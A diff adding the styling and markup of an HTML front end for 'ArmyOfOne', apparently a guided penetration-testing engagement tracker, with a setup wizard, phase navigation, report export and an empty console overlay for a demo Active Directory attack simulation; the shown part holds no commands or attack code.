@@ -1,0 +1,3293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ArmyOfOne — Guided Penetration Testing</title>
+<style>
+/* ============================================================
+   CSS CUSTOM PROPERTIES & RESET
+   ============================================================ */
+:root {
+  --bg-primary: #0d1117;
+  --bg-secondary: #161b22;
+  --bg-tertiary: #21262d;
+  --bg-hover: #30363d;
+  --border: #30363d;
+  --border-light: #484f58;
+  --text-primary: #e6edf3;
+  --text-secondary: #8b949e;
+  --text-muted: #6e7681;
+  --accent: #58a6ff;
+  --accent-hover: #79c0ff;
+  --green: #3fb950;
+  --green-bg: #0d2818;
+  --red: #f85149;
+  --red-bg: #2d1214;
+  --orange: #d29922;
+  --orange-bg: #2e1f0f;
+  --yellow: #e3b341;
+  --yellow-bg: #2e2a0f;
+  --blue: #58a6ff;
+  --blue-bg: #0c2d6b;
+  --purple: #bc8cff;
+  --grey: #8b949e;
+  --critical-color: #f85149;
+  --high-color: #d29922;
+  --medium-color: #e3b341;
+  --low-color: #58a6ff;
+  --info-color: #8b949e;
+  --font-mono: 'SF Mono', 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+  --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  --radius: 6px;
+  --radius-lg: 10px;
+  --shadow: 0 3px 12px rgba(0,0,0,0.4);
+  --shadow-lg: 0 8px 24px rgba(0,0,0,0.6);
+  --transition: 0.2s ease;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+  height: 100%;
+  font-family: var(--font-sans);
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.5;
+  font-size: 14px;
+}
+
+/* ============================================================
+   LAYOUT
+   ============================================================ */
+.app {
+  display: flex;
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* Sidebar */
+.sidebar {
+  width: 260px;
+  min-width: 260px;
+  background: var(--bg-secondary);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  overflow-y: auto;
+}
+
+.sidebar-header {
+  padding: 16px 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.sidebar-header h1 {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--accent);
+  letter-spacing: 0.5px;
+}
+
+.sidebar-header .project-name {
+  font-size: 12px;
+  color: var(--text-secondary);
+  margin-top: 4px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.sidebar-header .engagement-badge {
+  display: inline-block;
+  font-size: 10px;
+  padding: 2px 6px;
+  border-radius: 3px;
+  background: var(--bg-tertiary);
+  color: var(--text-secondary);
+  margin-top: 4px;
+  border: 1px solid var(--border);
+}
+
+/* Phase navigation */
+.phase-nav {
+  flex: 1;
+  padding: 8px 0;
+}
+
+.phase-nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 20px;
+  cursor: pointer;
+  border: none;
+  background: none;
+  color: var(--text-secondary);
+  font-size: 13px;
+  width: 100%;
+  text-align: left;
+  transition: background var(--transition), color var(--transition);
+  position: relative;
+  font-family: var(--font-sans);
+}
+
+.phase-nav-item:hover {
+  background: var(--bg-hover);
+  color: var(--text-primary);
+}
+
+.phase-nav-item.active {
+  background: var(--bg-tertiary);
+  color: var(--text-primary);
+  border-right: 2px solid var(--accent);
+}
+
+.phase-nav-item .phase-num {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 11px;
+  font-weight: 600;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.phase-nav-item.completed .phase-num {
+  background: var(--green);
+  border-color: var(--green);
+  color: #fff;
+}
+
+.phase-nav-item.active .phase-num {
+  background: var(--accent);
+  border-color: var(--accent);
+  color: #fff;
+}
+
+.phase-nav-item .phase-label {
+  flex: 1;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.phase-nav-item .phase-progress {
+  font-size: 10px;
+  color: var(--text-muted);
+}
+
+/* Sidebar footer */
+.sidebar-footer {
+  padding: 12px 16px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.sidebar-footer button {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 6px 10px;
+  font-size: 12px;
+  background: none;
+  border: 1px solid var(--border);
+  color: var(--text-secondary);
+  border-radius: var(--radius);
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: var(--font-sans);
+}
+
+.sidebar-footer button:hover {
+  background: var(--bg-hover);
+  color: var(--text-primary);
+}
+
+/* Main content */
+.main-content {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.main-header {
+  padding: 16px 24px;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg-secondary);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+}
+
+.main-header h2 {
+  font-size: 18px;
+  font-weight: 600;
+}
+
+.main-header .phase-description {
+  font-size: 13px;
+  color: var(--text-secondary);
+}
+
+.main-body {
+  flex: 1;
+  overflow-y: auto;
+  padding: 24px;
+}
+
+/* Progress bar (top) */
+.progress-bar-container {
+  padding: 0 24px;
+  background: var(--bg-secondary);
+  padding-bottom: 12px;
+}
+
+.progress-bar {
+  height: 4px;
+  background: var(--bg-tertiary);
+  border-radius: 2px;
+  overflow: hidden;
+}
+
+.progress-bar-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--accent), var(--green));
+  transition: width 0.4s ease;
+  border-radius: 2px;
+}
+
+.progress-text {
+  font-size: 11px;
+  color: var(--text-muted);
+  margin-top: 4px;
+  text-align: right;
+}
+
+/* ============================================================
+   COMPONENTS
+   ============================================================ */
+
+/* Buttons */
+.btn {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  padding: 8px 16px;
+  font-size: 13px;
+  font-weight: 500;
+  border-radius: var(--radius);
+  border: 1px solid var(--border);
+  background: var(--bg-tertiary);
+  color: var(--text-primary);
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: var(--font-sans);
+  white-space: nowrap;
+}
+
+.btn:hover { background: var(--bg-hover); border-color: var(--border-light); }
+.btn-primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+.btn-primary:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
+.btn-danger { background: var(--red-bg); border-color: var(--red); color: var(--red); }
+.btn-danger:hover { background: var(--red); color: #fff; }
+.btn-success { background: var(--green-bg); border-color: var(--green); color: var(--green); }
+.btn-success:hover { background: var(--green); color: #fff; }
+.btn-sm { padding: 4px 10px; font-size: 12px; }
+.btn-group { display: flex; gap: 8px; flex-wrap: wrap; }
+
+/* Cards */
+.card {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 20px;
+  margin-bottom: 16px;
+}
+
+.card-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 16px;
+}
+
+.card-header h3 {
+  font-size: 15px;
+  font-weight: 600;
+}
+
+/* Form elements */
+.form-group {
+  margin-bottom: 16px;
+}
+
+.form-group label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-secondary);
+  margin-bottom: 6px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.form-control {
+  width: 100%;
+  padding: 8px 12px;
+  font-size: 13px;
+  background: var(--bg-primary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  color: var(--text-primary);
+  font-family: var(--font-sans);
+  transition: border-color var(--transition);
+}
+
+.form-control:focus {
+  outline: none;
+  border-color: var(--accent);
+}
+
+textarea.form-control {
+  resize: vertical;
+  min-height: 80px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+}
+
+select.form-control {
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%238b949e' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 10px center;
+  padding-right: 30px;
+}
+
+.form-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+}
+
+.form-row-3 {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 16px;
+}
+
+/* Checklist */
+.checklist {
+  list-style: none;
+}
+
+.checklist-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  padding: 8px 0;
+  border-bottom: 1px solid var(--border);
+}
+
+.checklist-item:last-child { border-bottom: none; }
+
+.checklist-item input[type="checkbox"] {
+  appearance: none;
+  width: 18px;
+  height: 18px;
+  border: 2px solid var(--border-light);
+  border-radius: 4px;
+  background: var(--bg-primary);
+  cursor: pointer;
+  flex-shrink: 0;
+  margin-top: 1px;
+  position: relative;
+  transition: all var(--transition);
+}
+
+.checklist-item input[type="checkbox"]:checked {
+  background: var(--green);
+  border-color: var(--green);
+}
+
+.checklist-item input[type="checkbox"]:checked::after {
+  content: '✓';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  color: #fff;
+  font-size: 11px;
+  font-weight: 700;
+}
+
+.checklist-item label {
+  font-size: 13px;
+  cursor: pointer;
+  flex: 1;
+}
+
+.checklist-item.done label {
+  text-decoration: line-through;
+  color: var(--text-muted);
+}
+
+/* Severity badges */
+.severity { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+.severity-critical { background: var(--red-bg); color: var(--critical-color); border: 1px solid var(--critical-color); }
+.severity-high { background: var(--orange-bg); color: var(--high-color); border: 1px solid var(--high-color); }
+.severity-medium { background: var(--yellow-bg); color: var(--medium-color); border: 1px solid var(--medium-color); }
+.severity-low { background: var(--blue-bg); color: var(--low-color); border: 1px solid var(--low-color); }
+.severity-info { background: var(--bg-tertiary); color: var(--info-color); border: 1px solid var(--info-color); }
+
+/* Tables */
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+}
+
+.data-table th {
+  text-align: left;
+  padding: 8px 12px;
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-muted);
+  border-bottom: 1px solid var(--border);
+}
+
+.data-table td {
+  padding: 10px 12px;
+  border-bottom: 1px solid var(--border);
+  vertical-align: top;
+}
+
+.data-table tr:hover td {
+  background: var(--bg-tertiary);
+}
+
+.data-table .actions { white-space: nowrap; }
+
+/* Tabs */
+.tabs {
+  display: flex;
+  gap: 0;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 16px;
+}
+
+.tab-btn {
+  padding: 10px 16px;
+  font-size: 13px;
+  font-weight: 500;
+  background: none;
+  border: none;
+  border-bottom: 2px solid transparent;
+  color: var(--text-secondary);
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: var(--font-sans);
+}
+
+.tab-btn:hover { color: var(--text-primary); }
+.tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* Modal */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.2s;
+}
+
+.modal-overlay.visible {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.modal {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  width: 90%;
+  max-width: 600px;
+  max-height: 85vh;
+  overflow-y: auto;
+  box-shadow: var(--shadow-lg);
+}
+
+.modal-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.modal-header h3 { font-size: 16px; }
+
+.modal-close {
+  background: none;
+  border: none;
+  color: var(--text-secondary);
+  font-size: 20px;
+  cursor: pointer;
+  padding: 4px;
+  line-height: 1;
+}
+
+.modal-close:hover { color: var(--text-primary); }
+
+.modal-body { padding: 20px; }
+.modal-footer { padding: 12px 20px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 8px; }
+
+/* Wizard */
+.wizard-container {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  padding: 24px;
+}
+
+.wizard {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  width: 100%;
+  max-width: 700px;
+  box-shadow: var(--shadow-lg);
+}
+
+.wizard-header {
+  padding: 24px 32px;
+  border-bottom: 1px solid var(--border);
+  text-align: center;
+}
+
+.wizard-header h1 {
+  font-size: 24px;
+  color: var(--accent);
+  margin-bottom: 4px;
+}
+
+.wizard-header p {
+  color: var(--text-secondary);
+  font-size: 14px;
+}
+
+.wizard-body { padding: 32px; }
+
+.wizard-steps {
+  display: flex;
+  justify-content: center;
+  gap: 8px;
+  margin-bottom: 28px;
+}
+
+.wizard-step-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  transition: all var(--transition);
+}
+
+.wizard-step-dot.active { background: var(--accent); border-color: var(--accent); }
+.wizard-step-dot.completed { background: var(--green); border-color: var(--green); }
+
+.wizard-step { display: none; }
+.wizard-step.active { display: block; }
+
+.wizard-footer {
+  padding: 16px 32px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  justify-content: space-between;
+}
+
+/* Option cards (wizard selectors) */
+.option-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  gap: 12px;
+  margin-bottom: 16px;
+}
+
+.option-grid-2 {
+  grid-template-columns: 1fr 1fr;
+}
+
+.option-card {
+  border: 2px solid var(--border);
+  border-radius: var(--radius-lg);
+  padding: 16px;
+  cursor: pointer;
+  transition: all var(--transition);
+  text-align: center;
+  background: var(--bg-primary);
+}
+
+.option-card:hover {
+  border-color: var(--border-light);
+  background: var(--bg-tertiary);
+}
+
+.option-card.selected {
+  border-color: var(--accent);
+  background: var(--blue-bg);
+}
+
+.option-card .option-icon {
+  font-size: 28px;
+  margin-bottom: 8px;
+  display: block;
+}
+
+.option-card .option-title {
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 4px;
+}
+
+.option-card .option-desc {
+  font-size: 11px;
+  color: var(--text-secondary);
+  line-height: 1.4;
+}
+
+/* Empty state */
+.empty-state {
+  text-align: center;
+  padding: 40px 20px;
+  color: var(--text-muted);
+}
+
+.empty-state .empty-icon {
+  font-size: 40px;
+  margin-bottom: 12px;
+  display: block;
+}
+
+.empty-state p {
+  font-size: 14px;
+  margin-bottom: 16px;
+}
+
+/* Notes area */
+.notes-area {
+  margin-top: 16px;
+}
+
+/* Tool suggestion chips */
+.tool-chips {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin-top: 8px;
+}
+
+.tool-chip {
+  display: inline-block;
+  padding: 3px 10px;
+  font-size: 11px;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  color: var(--text-secondary);
+  font-family: var(--font-mono);
+}
+
+/* Toast notification */
+.toast {
+  position: fixed;
+  bottom: 24px;
+  right: 24px;
+  padding: 12px 20px;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  color: var(--text-primary);
+  font-size: 13px;
+  box-shadow: var(--shadow);
+  z-index: 2000;
+  transform: translateY(100px);
+  opacity: 0;
+  transition: all 0.3s ease;
+}
+
+.toast.visible { transform: translateY(0); opacity: 1; }
+.toast.success { border-color: var(--green); }
+.toast.error { border-color: var(--red); }
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 8px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--bg-hover); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: var(--border-light); }
+
+/* Hide app when wizard is visible */
+.app.hidden { display: none; }
+.wizard-container.hidden { display: none; }
+
+/* ============================================================
+   SIMULATION OVERLAY
+   ============================================================ */
+.sim-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.92);
+  z-index: 3000;
+  display: flex;
+  flex-direction: column;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s;
+}
+
+.sim-overlay.visible {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.sim-header {
+  padding: 16px 24px;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: var(--bg-secondary);
+}
+
+.sim-header h2 {
+  font-size: 16px;
+  color: var(--red);
+  font-family: var(--font-mono);
+}
+
+.sim-header .sim-phase-label {
+  font-size: 13px;
+  color: var(--accent);
+  font-weight: 600;
+}
+
+.sim-header .sim-controls {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+}
+
+.sim-progress-container {
+  padding: 8px 24px;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border);
+}
+
+.sim-progress-bar {
+  height: 3px;
+  background: var(--bg-tertiary);
+  border-radius: 2px;
+  overflow: hidden;
+}
+
+.sim-progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--red), var(--orange), var(--green));
+  transition: width 0.3s ease;
+  border-radius: 2px;
+  width: 0%;
+}
+
+.sim-body {
+  flex: 1;
+  display: flex;
+  overflow: hidden;
+}
+
+.sim-terminal {
+  flex: 2;
+  background: #000;
+  overflow-y: auto;
+  padding: 16px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  line-height: 1.6;
+}
+
+.sim-terminal .line {
+  margin-bottom: 2px;
+  opacity: 0;
+  animation: simFadeIn 0.15s forwards;
+}
+
+@keyframes simFadeIn {
+  to { opacity: 1; }
+}
+
+.sim-terminal .line-prompt { color: var(--green); }
+.sim-terminal .line-cmd { color: #f0f0f0; }
+.sim-terminal .line-output { color: var(--text-secondary); }
+.sim-terminal .line-success { color: var(--green); }
+.sim-terminal .line-warning { color: var(--orange); }
+.sim-terminal .line-error { color: var(--red); }
+.sim-terminal .line-info { color: var(--accent); }
+.sim-terminal .line-critical { color: var(--red); font-weight: 700; }
+.sim-terminal .line-header {
+  color: var(--purple);
+  font-weight: 700;
+  font-size: 13px;
+  margin-top: 12px;
+  margin-bottom: 4px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 4px;
+}
+
+.sim-sidebar {
+  flex: 1;
+  max-width: 340px;
+  border-left: 1px solid var(--border);
+  background: var(--bg-secondary);
+  overflow-y: auto;
+  padding: 16px;
+}
+
+.sim-sidebar h4 {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-muted);
+  margin-bottom: 8px;
+  margin-top: 16px;
+}
+
+.sim-sidebar h4:first-child { margin-top: 0; }
+
+.sim-sidebar .sim-item {
+  padding: 6px 10px;
+  font-size: 12px;
+  background: var(--bg-primary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  margin-bottom: 4px;
+  font-family: var(--font-mono);
+  opacity: 0;
+  animation: simFadeIn 0.2s forwards;
+}
+
+.sim-sidebar .sim-item.asset { border-left: 3px solid var(--accent); }
+.sim-sidebar .sim-item.finding { border-left: 3px solid var(--orange); }
+.sim-sidebar .sim-item.vuln-critical { border-left: 3px solid var(--red); }
+.sim-sidebar .sim-item.vuln-high { border-left: 3px solid var(--orange); }
+
+.sim-phase-badge {
+  display: inline-block;
+  padding: 2px 8px;
+  font-size: 10px;
+  border-radius: 3px;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+.sim-phase-badge.active {
+  background: var(--blue-bg);
+  color: var(--accent);
+  border: 1px solid var(--accent);
+}
+
+/* Console replay mode */
+.sim-overlay.replay .sim-controls .sim-live-only { display: none; }
+
+.sim-overlay.replay .sim-terminal .line {
+  animation: none;
+  opacity: 1;
+}
+
+.sim-overlay.replay .sim-header h2 {
+  color: var(--accent);
+}
+
+.sim-search-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 6px 24px;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border);
+}
+
+.sim-search-bar input {
+  flex: 1;
+  padding: 5px 10px;
+  font-size: 12px;
+  font-family: var(--font-mono);
+  background: var(--bg-primary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  color: var(--text-primary);
+}
+
+.sim-search-bar input:focus { outline: none; border-color: var(--accent); }
+
+.sim-search-bar .search-count {
+  font-size: 11px;
+  color: var(--text-muted);
+  font-family: var(--font-mono);
+  min-width: 60px;
+}
+
+.sim-terminal .line.highlight {
+  background: rgba(88, 166, 255, 0.15);
+  border-radius: 2px;
+}
+
+/* Console button in sidebar */
+.sidebar-footer .btn-console {
+  background: var(--bg-primary);
+  border-color: var(--accent);
+  color: var(--accent);
+}
+
+.sidebar-footer .btn-console:hover {
+  background: var(--blue-bg);
+}
+
+/* Demo button on wizard */
+.wizard-demo-btn {
+  display: block;
+  margin: 8px auto 0;
+  padding: 6px 16px;
+  font-size: 12px;
+  background: var(--red-bg);
+  border: 1px solid var(--red);
+  color: var(--red);
+  border-radius: var(--radius);
+  cursor: pointer;
+  font-family: var(--font-mono);
+  transition: all var(--transition);
+}
+
+.wizard-demo-btn:hover {
+  background: var(--red);
+  color: #fff;
+}
+
+/* Speed selector */
+.sim-speed-select {
+  padding: 4px 8px;
+  font-size: 11px;
+  background: var(--bg-primary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  color: var(--text-primary);
+  font-family: var(--font-mono);
+}
+
+/* Utility */
+.text-muted { color: var(--text-muted); }
+.text-sm { font-size: 12px; }
+.mt-8 { margin-top: 8px; }
+.mt-16 { margin-top: 16px; }
+.mb-16 { margin-bottom: 16px; }
+.flex-between { display: flex; align-items: center; justify-content: space-between; }
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     WIZARD: New Project / Engagement Setup
+     ============================================================ -->
+<div id="wizard-container" class="wizard-container">
+  <div class="wizard">
+    <div class="wizard-header">
+      <h1>ArmyOfOne</h1>
+      <p>Guided Penetration Testing</p>
+      <button class="wizard-demo-btn" onclick="DemoSimulation.start()">&#9889; Run Demo — EvilCorp AD Attack</button>
+    </div>
+    <div class="wizard-body">
+      <div class="wizard-steps">
+        <div class="wizard-step-dot active" data-step="0"></div>
+        <div class="wizard-step-dot" data-step="1"></div>
+        <div class="wizard-step-dot" data-step="2"></div>
+        <div class="wizard-step-dot" data-step="3"></div>
+      </div>
+
+      <!-- Step 0: Project Info -->
+      <div class="wizard-step active" data-step="0">
+        <h3 style="margin-bottom:16px;">Project Details</h3>
+        <div class="form-group">
+          <label>Project Name</label>
+          <input type="text" class="form-control" id="wiz-name" placeholder="e.g. Acme Corp Web App Assessment">
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label>Start Date</label>
+            <input type="date" class="form-control" id="wiz-start">
+          </div>
+          <div class="form-group">
+            <label>End Date</label>
+            <input type="date" class="form-control" id="wiz-end">
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Scope / Target Description</label>
+          <textarea class="form-control" id="wiz-scope" placeholder="Describe the targets and boundaries of this engagement..."></textarea>
+        </div>
+      </div>
+
+      <!-- Step 1: Test Type -->
+      <div class="wizard-step" data-step="1">
+        <h3 style="margin-bottom:16px;">Test Type</h3>
+        <p class="text-muted text-sm mb-16">What are you testing?</p>
+        <div class="option-grid" id="wiz-test-type">
+          <div class="option-card" data-value="webapp">
+            <span class="option-icon">&#127760;</span>
+            <div class="option-title">Web Application</div>
+            <div class="option-desc">OWASP Top 10, auth flows, injection, session mgmt</div>
+          </div>
+          <div class="option-card" data-value="api">
+            <span class="option-icon">&#128268;</span>
+            <div class="option-title">API</div>
+            <div class="option-desc">REST, GraphQL, SOAP — auth, BOLA, rate limiting</div>
+          </div>
+          <div class="option-card" data-value="infrastructure">
+            <span class="option-icon">&#128421;</span>
+            <div class="option-title">Infrastructure</div>
+            <div class="option-desc">Networks, servers, services, segmentation, patching</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2: Knowledge Level -->
+      <div class="wizard-step" data-step="2">
+        <h3 style="margin-bottom:16px;">Knowledge Level</h3>
+        <p class="text-muted text-sm mb-16">What do you know going in?</p>
+        <div class="option-grid" id="wiz-knowledge">
+          <div class="option-card" data-value="blackbox">
+            <span class="option-icon">&#11035;</span>
+            <div class="option-title">Black Box</div>
+            <div class="option-desc">No prior knowledge — external attacker simulation</div>
+          </div>
+          <div class="option-card" data-value="greybox">
+            <span class="option-icon">&#9723;</span>
+            <div class="option-title">Grey Box</div>
+            <div class="option-desc">Partial knowledge — some credentials or docs provided</div>
+          </div>
+          <div class="option-card" data-value="whitebox">
+            <span class="option-icon">&#11036;</span>
+            <div class="option-title">White Box</div>
+            <div class="option-desc">Full knowledge — source code, architecture, admin access</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3: Scenario Theme -->
+      <div class="wizard-step" data-step="3">
+        <h3 style="margin-bottom:16px;">Scenario Theme</h3>
+        <p class="text-muted text-sm mb-16">Optional: select a specialized scenario</p>
+        <div class="option-grid option-grid-2" id="wiz-scenario">
+          <div class="option-card selected" data-value="standard">
+            <span class="option-icon">&#127919;</span>
+            <div class="option-title">Standard</div>
+            <div class="option-desc">Classic PTES methodology — no special scenario</div>
+          </div>
+          <div class="option-card" data-value="assume_breach">
+            <span class="option-icon">&#128274;</span>
+            <div class="option-title">Assume Breach</div>
+            <div class="option-desc">Start with initial access — AD, lateral movement, domain dominance</div>
+          </div>
+          <div class="option-card" data-value="m365">
+            <span class="option-icon">&#9729;</span>
+            <div class="option-title">Microsoft 365</div>
+            <div class="option-desc">Entra ID, Exchange Online, SharePoint, Teams, OAuth apps</div>
+          </div>
+          <div class="option-card" data-value="enterprise_wide">
+            <span class="option-icon">&#127970;</span>
+            <div class="option-title">Enterprise Wide</div>
+            <div class="option-desc">Full scope — network, web, API, cloud, phishing, physical</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="wizard-footer">
+      <button class="btn" id="wiz-back" style="visibility:hidden;">Back</button>
+      <button class="btn btn-primary" id="wiz-next">Next</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================================
+     MAIN APP
+     ============================================================ -->
+<div id="app" class="app hidden">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <h1>ArmyOfOne</h1>
+      <div class="project-name" id="sidebar-project-name"></div>
+      <div class="engagement-badge" id="sidebar-badge"></div>
+    </div>
+    <nav class="phase-nav" id="phase-nav" role="navigation" aria-label="Pentest phases"></nav>
+    <div class="sidebar-footer">
+      <button id="btn-view-console" class="btn-console" style="display:none" onclick="ConsoleView.open()" title="View attack simulation console log">&#9889; View Console</button>
+      <button onclick="App.exportJSON()" title="Export project as JSON">&#128190; Export JSON</button>
+      <button onclick="App.importJSON()" title="Import project from JSON">&#128194; Import JSON</button>
+      <button onclick="App.exportReport()" title="Generate report">&#128196; Export Report</button>
+      <button onclick="App.newProject()" title="Start new project">&#10010; New Project</button>
+    </div>
+  </aside>
+
+  <!-- Main content -->
+  <div class="main-content">
+    <div class="main-header">
+      <div>
+        <h2 id="phase-title"></h2>
+        <div class="phase-description" id="phase-description"></div>
+      </div>
+      <div class="btn-group" id="phase-actions"></div>
+    </div>
+    <div class="progress-bar-container">
+      <div class="progress-bar"><div class="progress-bar-fill" id="progress-fill"></div></div>
+      <div class="progress-text" id="progress-text"></div>
+    </div>
+    <div class="main-body" id="main-body"></div>
+  </div>
+</div>
+
+<!-- Modal -->
+<div class="modal-overlay" id="modal-overlay">
+  <div class="modal" id="modal">
+    <div class="modal-header">
+      <h3 id="modal-title"></h3>
+      <button class="modal-close" onclick="UI.closeModal()">&times;</button>
+    </div>
+    <div class="modal-body" id="modal-body"></div>
+    <div class="modal-footer" id="modal-footer"></div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<!-- Hidden file input for import -->
+<input type="file" id="file-import" accept=".json" style="display:none">
+
+<!-- Simulation Overlay -->
+<div class="sim-overlay" id="sim-overlay">
+  <div class="sim-header">
+    <h2 id="sim-title">&#9889; EVILCORP.LOCAL — Attack Simulation</h2>
+    <span class="sim-phase-label" id="sim-phase-label">Initializing...</span>
+    <div class="sim-controls">
+      <span class="sim-live-only">
+        <label style="font-size:11px;color:var(--text-muted);">Speed:</label>
+        <select class="sim-speed-select" id="sim-speed" onchange="DemoSimulation.setSpeed(this.value)">
+          <option value="fast">Fast</option>
+          <option value="normal" selected>Normal</option>
+          <option value="slow">Slow</option>
+        </select>
+        <button class="btn btn-sm btn-danger" onclick="DemoSimulation.stop()">Stop</button>
+      </span>
+      <button class="btn btn-sm" id="sim-close-btn" style="display:none" onclick="ConsoleView.close()">Close</button>
+    </div>
+  </div>
+  <div class="sim-progress-container">
+    <div class="sim-progress-bar"><div class="sim-progress-fill" id="sim-progress-fill"></div></div>
+  </div>
+  <div class="sim-search-bar" id="sim-search-bar" style="display:none">
+    <span style="font-size:12px;color:var(--text-muted);">&#128269;</span>
+    <input type="text" id="sim-search-input" placeholder="Search console output... (e.g. svc_veeam, DCSync, Kerberoast)" oninput="ConsoleView.search(this.value)">
+    <span class="search-count" id="sim-search-count"></span>
+    <button class="btn btn-sm" onclick="ConsoleView.prevMatch()">&#9650;</button>
+    <button class="btn btn-sm" onclick="ConsoleView.nextMatch()">&#9660;</button>
+  </div>
+  <div class="sim-body">
+    <div class="sim-terminal" id="sim-terminal"></div>
